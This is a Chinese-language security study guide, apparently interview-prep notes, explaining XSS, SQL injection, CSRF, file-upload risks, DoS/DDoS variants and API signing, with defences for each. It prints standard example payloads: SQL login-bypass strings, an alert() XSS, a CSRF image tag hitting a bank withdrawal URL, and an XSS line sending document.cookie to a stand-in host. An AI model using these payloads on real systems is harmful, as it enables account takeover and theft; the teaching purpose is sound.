# 系统安全

## 1.一般黑客常用的XSS网络攻击的原理是什么？

XSS的全称是Cross Site Script，就是跨站点脚本攻击，意思就是说，黑客恶意篡改你的网页的前端代码，在里面注入一些他自己的html+javascript的脚本和代码，然后你比如在访问那个网站的网页的时候，他注入的那些恶意脚本就会运行了。

恶意脚本运行的时候就会控制你的浏览器，这个时候他的脚本就可以做很多很多的事情了。

第一种XSS攻击是反射型攻击，他主要是想办法让你点击一个URL链接，在这个URL链接里就嵌入他自己的恶意脚本，你点击那个URL链接之后，那个URL指向的是黑客自己的服务器上的一段恶意脚本。然后恶意脚本被返回到你的浏览器里就会运行，然后就可以控制你的浏览器里的行为了。

另外一种XSS攻击是叫做持久型攻击，这个意思就是说，举个例子，比如是个什么论坛、或者社交网站之类的系统，不是你可以发布一些帖子啊，或者是评论啥的内容么，此时黑客就可以在里面写一段恶意脚本。

然后把恶意脚本混杂在评论内容里提交到你的网站的数据库里去。

然后后面比如其他用户在社交网站里浏览到了你的这个评论，评论内容会被返回到浏览器里去，此时评论内容是包含恶意js脚本的，马上恶意脚本运行，又可以干坏事儿了，干的坏事儿就跟之前是一样的。

### 防止XSS攻击

消毒机制，这就是说，如果黑客在一些评论之类的内容里混入恶意脚本，那么你的代码里必须对内容进行消毒，就是进行一些转义，比如说把>转义为&gt之类的，这样就可以把恶意脚本里的html标签、js代码之类的东西，都给转义掉，让这些恶意脚本失效。

<html> -> &lthtml&gt，这种东西在浏览器里是不会运行的。

<html><script>// 包含恶意脚本</script></html>。

这样的话，转义以后的脚本被其他用户看到的时候也不会在浏览器里运行了。

HttpOnly方式，这个意思是说如果你在浏览器里存放cookie的时候，可以设置一个HttpOnly属性，比如说存放用户加密认证信息的cookie，这样的话，在浏览器里运行的js脚本是被禁止访问这些HttpOnly cookie的，他就无法窃取你在浏览器里存储的cookie了。

## 2.SQL注入攻击背后的原理是什么？

SQL语句里可以拼接进去各种支持的SQL语法，包括对数据库施加的命令，甚至通过附加一些脚本直接窃取你的数据，都是有可能的 。

但是如果要给你搞SQL注入，其实也不是那么容易的，因为必须要知道你的数据库表结构才行，一般获取数据库表结构的方式就下面几种：

（1）如果你使用的是开源软件，比如开源的博客系统，论坛系统，或者别的什么系统，那么人家自然知道你的表结构了，这种情况是比较少见的。

（2）错误回显，不知道大家有没有经历过这种，就是你有时候把系统跑在web服务器里，然后程序报错了，结果直接在浏览器页面上显示出来了你的异常堆栈信息，包括有错误的SQL语句，这就尴尬了，通过这个，黑客直接就知道你的表结构了。

（3）根据你的请求参数的名称，大致推测你的数据库表结构，这个一般不太现实。

### 防止SQL注入

一个是别让人家知道你的数据表结构，关闭web服务器的错误回显，显示一个400，500之类的就可以了，另外一个，就是要用预编译的方法，现在mybatis、hibernate都是支持预编译的。

这个预编译，就是说把黑客在参数里混进来来的SQL语句当做一个参数，而绝对不会作为独立的SQL语句去执行，这就避免了SQL注入攻击了。

## 3.CSRF攻击背后的原理是什么？

Cross Site Request Forgery，垮站点请求伪造。

这个就是黑客想办法去伪造成你这个用户去发送请求到某个系统上去，然后查询你的数据，转账交易之类的，伪装成你，也有很多办法，比如利用XSS搞一个恶意脚本让你执行，然后盗取你的浏览器里的cookie。

利用你的cookie伪装成你登录的状态，然后去执行一些请求。

利用XSS跨站点脚本攻击，获取cookie，然后再利用postman发送垮站点伪造请求。

### 防御CSRF的方法

（1）**防止cookie被窃取**：最最根本的，其实还是说防止cookie被窃取，可以给你的网站的cookie设置HttpOnly属性，禁止被别人的script脚本窃取，那么别人就无法伪造用户登录请求了。

（2）**随机token**：每次返回一个页面给你的时候，都生成一个随机token附加在页面的隐藏元素里，同时在你的redis里可以存以下，然后页面发送请求的时候附加随机token，验证通过才能执行请求，你要是自己用postman构造请求就不知道随机token是什么了。

（3）**验证码**：页面提交必须搞一个验证码，那种图形的，现在比较流行的还有拖动一个拼图什么的，必须验证码通过了才能执行你的请求，避免黑客直接伪造请求发送过来，这个其实是比较常见的，最好是在用户进行支付交易的时候，要求必须在页面上拖拽一个拼图验证码。

（4）**Referer请求头**：这个是http请求里有一个referer请求头，带有这个请求的来源，你可以验证一下这个请求是不是从自己的页面里来的，如果是的话才执行，否则就不要执行了。

## 4.如果你们的系统允许用户上传文件，可能会遭到什么样的黑客攻击？

很多时候如果我们的网站允许别人上传文件，那么文件可能是可执行的脚本，可能是病毒或者木马文件，其实这个是非常危险的，如果是脚本的话，可能会在服务器执行，搞很多破坏，比如黑客黑掉你的服务器，勒索你给他比特币之类的。

比如把自己的文件后缀改成.jpg、.txt之类的东西，来上传，其实本质病毒文件。

对于文件上传这块，核心的就是要进行白名单校验，限制上传文件的类型，只能是我们指定的，而且要限制文件的大小，还要对文件重命名，限制文件类型不能简单的根据后缀来判断，可能后缀被篡改了，要根据文件二进制数据的开头几个字节代表的magic number来判断文件的类型。

读取这个文件的二进制数据流，读取开头的几个字节，提取这个文件的魔数，根据魔数的值去判断他是什么类型的。

FFD8FF：JEPG

89504E47：PNG

类似这样，以此类推。

比如说你的网站要求用户只能上传word类型，png类型，此时你就限制仅仅这几种文件是可以上传的，其他的类型的文件都不让上传。

而且还要限制，不允许用户上传大文件，文件超过一定大小就不让上传了。

然后对上传好的文件进行重命名。

而且最好对文件进行一定的压缩，这样可以破坏原来的文件结构，避免文件在服务器执行，利用imagemagick这种开源包，可以很方便进行文件缩放。

## 5.DDoS攻击到底是什么东西？

DDoS，distributed denial of service，分布式拒绝服务攻击，最可怕的黑客攻击，可以把你的网站、APP、系统给搞瘫痪了。

DoS攻击，就是说黑客知道你的服务器地址了，然后你的系统假设每秒就抗下1000请求，黑客就以每秒1000请求访问你，你的服务器线程资源全部打满，正常用户根本无法发送请求，你的网站就宕机了。

甚至他以每秒1万请求攻击你的服务器呢，那就的系统机器就挂了。

DoS攻击是一对一的，就是黑客搞一台高性能服务器，拼命发送请求给你的一台服务器，但是如果你的服务器配置超高，每秒抗1万请求，结果黑客的机器每秒才5000请求，那么就没用了。

DDoS的意思就是黑客控制大量的机器，比如普通人的电脑，或者是一些公司的服务器，被他的一些木马植入给控制了，就是所谓的“肉鸡”，然后黑客下达指令，让所有肉鸡一起发送请求给攻击目标，直接搞瘫你的服务器。

如何防御DDoS攻击？自己其实挺难的，这其实是非常专业的一种攻击手段，通常我们可以采购云厂商的安全服务，比如DDoS高防IP，可以把攻击流量都导入到云厂商的高防IP的服务器上去，他们有专业的技术方案和算法来防御。

## 6.DNS Query Flood攻击

这个DNS Query Flood攻击，顾名思义，就是去攻击DNS服务器，也就是伪造大量的域名解析请求发送给DNS服务器，然后DNS服务器必然没有，接着必然会去找上级DNS服务器，一直到根域名服务器。

这么搞必然导致DNS服务器的资源别耗尽，其他正常人浏览网页也要解析域名的，此时就没法访问DNS服务器了。

## 7.Zuul网关是如何防止网络攻击的？

XSS核心是设置cookie的http only属性，过滤脚本，CRSF也是设置cookie的http only属性，根据referer请求头来过滤，设置表单随机参数，SQL注入就是过滤恶意参数，DDoS攻击主要就是限流。

zuul网关里加一个过滤器，过滤器里去过滤一些特殊请求的脚本，根据referer请求头过滤，对请求的随机token进行校验，甚至可以对参数进行校验，如果参数里包含SQL说明要注入，全部过滤，对ip地址可以进行基于redis的访问计数，比如说一个ip地址一秒内连续访问5次，那么就直接禁止访问。

## 8.API 接口应该如何设计？如何保证安全？如何签名？如何防重？

### **token 简介**

Token：访问令牌access token, 用于接口中, 用于标识接口调用者的身份、凭证，减少用户名和密码的传输次数。一般情况下客户端(接口调用方)需要先向服务器端申请一个接口调用的账号，服务器会给出一个appId和一个key, key用于参数签名使用，注意key保存到客户端，需要做一些安全处理，防止泄露。

Token的值一般是UUID，服务端生成Token后需要将token做为key，将一些和token关联的信息作为value保存到缓存服务器中(redis)，当一个请求过来后，服务器就去缓存服务器中查询这个Token是否存在，存在则调用接口，不存在返回接口错误，一般通过拦截器或者过滤器来实现，Token分为两种：

- **API Token(接口令牌):** 用于访问不需要用户登录的接口，如登录、注册、一些基本数据的获取等。获取接口令牌需要拿appId、timestamp和sign来换，sign=加密(timestamp+key)
- **USER Token(用户令牌):** 用于访问需要用户登录之后的接口，如：获取我的基本信息、保存、修改、删除等操作。获取用户令牌需要拿用户名和密码来换

关于Token的时效性：token可以是一次性的、也可以在一段时间范围内是有效的，具体使用哪种看业务需要。

一般情况下接口最好使用https协议，如果使用http协议，Token机制只是一种减少被黑的可能性，其实只能防君子不能防小人。

一般token、timestamp和sign 三个参数会在接口中会同时作为参数传递，每个参数都有各自的用途。

### **timestamp 简介**

timestamp: 时间戳，是客户端调用接口时对应的当前时间戳，时间戳用于防止DoS攻击。

当黑客劫持了请求的url去DoS攻击，每次调用接口时接口都会判断服务器当前系统时间和接口中传的的timestamp的差值，如果这个差值超过某个设置的时间(假如5分钟)，那么这个请求将被拦截掉，如果在设置的超时时间范围内，是不能阻止DoS攻击的。timestamp机制只能减轻DoS攻击的时间，缩短攻击时间。如果黑客修改了时间戳的值可通过sign签名机制来处理。

DoS

DoS是Denial of Service的简称，即拒绝服务，造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。最常见的DoS攻击有计算机网络带宽攻击和连通性攻击。

DoS攻击是指故意的攻击网络协议实现的缺陷或直接通过野蛮手段残忍地耗尽被攻击对象的资源，目的是让目标计算机或网络无法提供正常的服务或资源访问，使目标系统服务系统停止响应甚至崩溃，而在此攻击中并不包括侵入目标服务器或目标网络设备。这些服务资源包括网络带宽，文件系统空间容量，开放的进程或者允许的连接。这种攻击会导致资源的匮乏，无论计算机的处理速度多快、内存容量多大、网络带宽的速度多快都无法避免这种攻击带来的后果。

- **Pingflood**: 该攻击在短时间内向目的主机发送大量ping包，造成网络堵塞或主机资源耗尽。
- **Synflood**: 该攻击以多个随机的源主机地址向目的主机发送SYN包，而在收到目的主机的SYN ACK后并不回应，这样，目的主机就为这些源主机建立了大量的连接队列，而且由于没有收到ACK一直维护着这些队列，造成了资源的大量消耗而不能向正常请求提供服务。
- **Smurf**：该攻击向一个子网的广播地址发一个带有特定请求（如ICMP回应请求）的包，并且将源地址伪装成想要攻击的主机地址。子网上所有主机都回应广播包请求而向被攻击主机发包，使该主机受到攻击。
- **Land-based**：攻击者将一个包的源地址和目的地址都设置为目标主机的地址，然后将该包通过IP欺骗的方式发送给被攻击主机，这种包可以造成被攻击主机因试图与自己建立连接而陷入死循环，从而很大程度地降低了系统性能。
- **Ping of Death**：根据TCP/IP的规范，一个包的长度最大为65536字节。尽管一个包的长度不能超过65536字节，但是一个包分成的多个片段的叠加却能做到。当一个主机收到了长度大于65536字节的包时，就是受到了Ping of Death攻击，该攻击会造成主机的宕机。
- **Teardrop**：IP数据包在网络传递时，数据包可以分成更小的片段。攻击者可以通过发送两段（或者更多）数据包来实现TearDrop攻击。第一个包的偏移量为0，长度为N，第二个包的偏移量小于N。为了合并这些数据段，TCP/IP堆栈会分配超乎寻常的巨大资源，从而造成系统资源的缺乏甚至机器的重新启动。
- **PingSweep**：使用ICMP Echo轮询多个主机。

### **sign 简介**

**nonce：**随机值，是客户端随机生成的值，作为参数传递过来，随机值的目的是增加sign签名的多变性。随机值一般是数字和字母的组合，6位长度，随机值的组成和长度没有固定规则。

**sign:** 一般用于参数签名，防止参数被非法篡改，最常见的是修改金额等重要敏感参数， sign的值一般是将所有非空参数按照升续排序然后+token+key+timestamp+nonce(随机数)拼接在一起，然后使用某种加密算法进行加密，作为接口中的一个参数sign来传递，也可以将sign放到请求头中。

接口在网络传输过程中如果被黑客挟持，并修改其中的参数值，然后再继续调用接口，虽然参数的值被修改了，但是因为黑客不知道sign是如何计算出来的，不知道sign都有哪些值构成，不知道以怎样的顺序拼接在一起的，最重要的是不知道签名字符串中的key是什么，所以黑客可以篡改参数的值，但没法修改sign的值，当服务器调用接口前会按照sign的规则重新计算出sign的值然后和接口传递的sign参数的值做比较，如果相等表示参数值没有被篡改，如果不等，表示参数被非法篡改了，就不执行接口了。

### **防止重复提交**

对于一些重要的操作需要防止客户端重复提交的(如非幂等性重要操作)，具体办法是当请求第一次提交时将sign作为key保存到redis，并设置超时时间，超时时间和Timestamp中设置的差值相同。

当同一个请求第二次访问时会先检测redis是否存在该sign，如果存在则证明重复提交了，接口就不再继续调用了。如果sign在缓存服务器中因过期时间到了，而被删除了，此时当这个url再次请求服务器时，因token的过期时间和sign的过期时间一直，sign过期也意味着token过期，那样同样的url再访问服务器会因token错误会被拦截掉，这就是为什么sign和token的过期时间要保持一致的原因。拒绝重复调用机制确保URL被别人截获了也无法使用（如抓取数据）。

对于哪些接口需要防止重复提交可以自定义个注解来标记。

注意：所有的安全措施都用上的话有时候难免太过复杂，在实际项目中需要根据自身情况作出裁剪，比如可以只使用签名机制就可以保证信息不会被篡改，或者定向提供服务的时候只用Token机制就可以了。如何裁剪，全看项目实际情况和对接口安全性的要求。

### **使用流程**

1.接口调用方(客户端)向接口提供方(服务器)申请接口调用账号，申请成功后，接口提供方会给接口调用方一个appId和一个key参数

2.客户端携带参数appId、timestamp、sign去调用服务器端的API token，其中sign=加密(appId + timestamp + key)

3.客户端拿着api_token 去访问不需要登录就能访问的接口

4.当访问用户需要登录的接口时，客户端跳转到登录页面，通过用户名和密码调用登录接口，登录接口会返回一个usertoken, 客户端拿着usertoken 去访问需要登录才能访问的接口

sign的作用是防止参数被篡改，客户端调用服务端时需要传递sign参数，服务器响应客户端时也可以返回一个sign用于客户度校验返回的值是否被非法篡改了。客户端传的sign和服务器端响应的sign算法可能会不同。

## 9.SQL 注入

答：SQL注入就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

**(1).SQL注入攻击的总体思路：**

1. 寻找到SQL注入的位置
2. 判断服务器类型和后台数据库类型
3. 针对不通的服务器和数据库特点进行SQL注入攻击

**(2). SQL注入攻击实例：**

比如，在一个登录界面，要求输入用户名和密码，可以这样输入实现免帐号登录：

```html
用户名： ‘or 1 = 1 --
密 码：
```

用户一旦点击登录，如若没有做特殊处理，那么这个非法用户就很得意的登陆进去了。这是为什么呢?下面我们分析一下：从理论上说，后台认证程序中会有如下的SQL语句：

```html
String sql = “select * from user_table where username=’ “+userName+” ’ and password=’ “+password+” ‘”;
```

因此，当输入了上面的用户名和密码，上面的SQL语句变成：

```html
SELECT * FROM user_table WHERE username=’’or 1 = 1 – and password=’’
```

分析上述SQL语句我们知道，username=‘ or 1=1 这个语句一定会成功；然后后面加两个-，这意味着注释，它将后面的语句注释，让他们不起作用。这样，上述语句永远都能正确执行，用户轻易骗过系统，获取合法身份。

**(3). 应对方法：**

1.参数绑定：

使用预编译手段，绑定参数是最好的防SQL注入的方法。目前许多的ORM框架及JDBC等都实现了SQL预编译和参数绑定功能，攻击者的恶意SQL会被当做SQL的参数而不是SQL命令被执行。在mybatis的mapper文件中，对于传递的参数我们一般是使用#和$来获取参数值。当使用#时，变量是占位符，就是一般我们使用javajdbc的PrepareStatement时的占位符，所有可以防止sql注入；当使用$时，变量就是直接追加在sql中，一般会有sql注入问题。

2.使用正则表达式过滤传入的参数

## 10.XSS 攻击

答：XSS是一种经常出现在web应用中的计算机安全漏洞，与SQL注入一起成为web中最主流的攻击方式。XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些脚本代码嵌入到web页面中去，使别的用户访问都会执行相应的嵌入代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

**(1). XSS攻击的危害：**

- 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
- 盗窃企业重要的具有商业价值的资料
- 非法转账
- 强制发送电子邮件
- 网站挂马
- 控制受害者机器向其它网站发起攻击

**(2). 原因解析：**

- **主要原因**：过于信任客户端提交的数据！
- **解决办法**：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。
- **进一步分析细节**：客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了，那么攻击者就可以肆无忌惮地展开攻击啦，因此我们绝不可以信任任何客户端提交的数据！！！

**(3). XSS 攻击分类：**

- 1. 反射性 XSS 攻击（非持久性 XSS 攻击）：

漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS攻击包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)，例如，正常发送消息：

```html
http://www.test.com/message.php?send=Hello,World！
```

接收者将会接收信息并显示Hello,World；但是，非正常发送消息：

```html
http://www.test.com/message.php?send=<script>alert(‘foolish!’)</script>！
```

接收者接收消息显示的时候将会弹出警告窗口！

- 1. 持久性XSS攻击 (留言板场景)：

XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。也就是说，每当用户使用浏览器打开指定页面时，脚本便执行。与非持久性XSS攻击相比，持久性XSS攻击危害性更大。从名字就可以了解到，持久性XSS攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。

例如，留言板表单中的表单域：

```html
<input type=“text” name=“content” value=“这里是用户填写的数据”>
```

正常操作流程是：用户是提交相应留言信息 —— 将数据存储到数据库 —— 其他用户访问留言板，应用去数据并显示；而非正常操作流程是攻击者在value填写:

```html
<script>alert(‘foolish!’)；</script> <!--或者html其他标签（破坏样式）、一段攻击型代码-->
```

并将数据提交、存储到数据库中；当其他用户取出数据显示的时候，将会执行这些攻击性代码。

**(4). 修复漏洞方针：**

漏洞产生的根本原因是 **太相信用户提交的数据，对用户所提交的数据过滤不足所导致的**，因此解决方案也应该从这个方面入手，具体方案包括：

- 将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了（如果在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击）；
- 表单数据规定值的类型，例如：年龄应为只能为int、name只能为字母数字组合。。。。
- 对数据进行Html Encode 处理
- 过滤或移除特殊的Html标签

### 66.什么是DDoS攻击

**分布式拒绝服务(DDoS：Distributed Denial of Service)攻击，是指攻击者利用大量“肉鸡”对攻击目标发动大量的正常或非正常请求、耗尽目标主机资源或网络资源，从而使被攻击的主机不能为正常用户提供服务。**

**DoS**

DoS（拒绝服务，Denial of Service）就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。这是早期非常基本的网络攻击方式。

在信息安全的三要素——**保密性**、**完整性**和**可用性**中，DoS针对的目标正是**可用性**。该攻击方式利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。

**DDoS**

一般来说，DDoS 攻击可以具体分成两种形式：带宽消耗型以及资源消耗型。它们都是透过大量合法或伪造的请求占用大量网络以及器材资源，以达到瘫痪网络以及系统的目的。

**DDoS的危害**

当服务器被DDos攻击时，一般会出现以下现象：

被攻击主机上有大量等待的TCP连接；

网络中充斥着大量的无用的数据包；

受害主机无法正常和外界通讯；

受害主机无法处理所有正常请求；严重时会造成系统死机。

对于用户来说，在常见的现象就是网站无法访问。

**DDoS的防范**

为了对抗 DDoS攻击，你需要对攻击时发生了什么有一个清楚的理解。简单来讲，DDoS 攻击可以通过利用服务器上的漏洞，或者消耗服务器上的资源(例如 内存、硬盘等等)来达到目的。

一般来说，可以用以下办法防范：

1、如果可以识别出攻击源，如机器IP等，可以在防火墙服务器上放置一份 ACL（访问控制列表) 来阻断这些来自这些 IP 的访问。

2、对于带宽消耗型攻击，最有效的办法那就是增加带宽。

3、提高服务器的服务能力，增加负载均衡，多地部署等。

4、优化资源使用提高 web server 的负载能力。例如，使用 apache 可以安装 apachebooster 插件，该插件与 varnish 和 nginx 集成，可以应对突增的流量和内存占用。

5、使用高可扩展性的 DNS 设备来保护针对 DNS 的 DDOS 攻击。可以考虑购买 Cloudfair 的商业解决方案，它可以提供针对 DNS 或 TCP/IP3 到7层的 DDOS 攻击保护。

6、启用路由器或防火墙的反IP欺骗功能。

7、付费，使用第三方的服务来保护你的网站。

8、监控网络和 web 的流量。时刻观察流量变化

9、保护好 DNS 避免 DNS 放大攻击。

# 攻击技术

## 一、跨站脚本攻击

### 概念

跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。

### 攻击原理

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

### 危害

- 窃取用户的 Cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

### 防范手段

\1. 设置 Cookie 为 HttpOnly

设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

\2. 过滤特殊字符

例如将 `<` 转义为 `<`，将 `>` 转义为 `>`，从而避免 HTML 和 Jascript 代码的运行。

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

## 二、跨站请求伪造

### 概念

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

### 攻击原理

假如一家银行用以执行转账操作的 URL 地址如下：

```html
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```html
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

### 防范手段

\1. 检查 Referer 首部字段

Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

\2. 添加校验 Token

在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

\3. 输入验证码

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

## 三、SQL 注入攻击

### 概念

服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。

### 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```html
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```html
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```html
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```html
strSQL = "SELECT * FROM users;"
```

### 防范手段

\1. 使用参数化查询

Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

```html
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

\2. 单引号转换

将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。

## 四、拒绝服务攻击

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。









